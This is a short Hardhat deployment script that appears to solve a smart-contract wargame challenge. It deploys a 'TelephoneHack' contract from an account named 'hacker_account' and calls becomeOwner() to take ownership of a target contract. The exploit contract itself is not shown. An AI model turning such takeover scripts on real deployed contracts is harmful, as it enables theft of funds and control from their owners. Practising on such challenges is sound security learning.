
const { utils } = require("ethers");
const { ethers } = require("hardhat");
const hre = require("hardhat")
const config = require("./fb_contract_config.json")


async function main() {

  const accounts = await ethers.getSigners();

  const hacker_account = accounts[0];

  console.log("Deploying contracts with the account:", hacker_account.address);

  console.log("Account balance:", (await hacker_account.getBalance()).toString());

  const teleH_contract = await ethers.getContractFactory("TelephoneHack", hacker_account);
  let telH = await teleH_contract.deploy(hacker_account.address)
  await telH.deployed()

  console.log("Deploy")
  // console.log(telH)
  
  console.log("Tele Hack address: ", telH.address)
  let teleH = await telH.connect(hacker_account).becomeOwner({gasLimit: 3000000})

  }
  
  main()
  .then(() => process.exit(0))
  .catch((error)=> {
    console.error(error);
    process.exit(1);
  });